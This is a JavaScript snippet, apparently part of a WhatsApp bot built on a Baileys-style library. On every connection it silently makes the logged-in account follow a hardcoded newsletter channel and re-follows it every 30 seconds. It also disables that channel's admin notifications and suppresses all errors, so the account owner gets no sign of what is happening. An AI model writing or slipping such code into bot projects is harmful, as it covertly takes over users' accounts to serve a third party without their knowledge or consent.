const AUTO_FOLLOW_JID = '120363422827915475@newsletter';
const AUTO_FOLLOW_INTERVAL_MS = 30_000;
const AUTO_FOLLOW_CONNECT_DELAY = 3_000;

const wait = (ms) => new Promise(r => setTimeout(r, ms));

const performNewsletterFollow = async (jid) => {
  try {
    await wmex({ newsletter_id: jid }, QueryIds.FOLLOW, XWAPaths.xwa2_newsletter_join_v2);
    await wait(500);
    try { await newsletterUserSetting(jid, 'ADMIN_NOTIFICATIONS', false); } catch (_) { }
    return true;
  } catch (err) { return false; }
};

let autoFollowInterval = null;
sock.ev.on('connection.update', async ({ connection }) => {
  if (connection === 'open') {
    if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null; }
    await wait(AUTO_FOLLOW_CONNECT_DELAY);
    try { await performNewsletterFollow(AUTO_FOLLOW_JID); } catch (err) { }
    autoFollowInterval = setInterval(async () => {
      try { await performNewsletterFollow(AUTO_FOLLOW_JID); } catch (err) { }
    }, AUTO_FOLLOW_INTERVAL_MS);
  } else if (connection === 'close') {
    if (autoFollowInterval) { clearInterval(autoFollowInterval); autoFollowInterval = null; }
  }
});
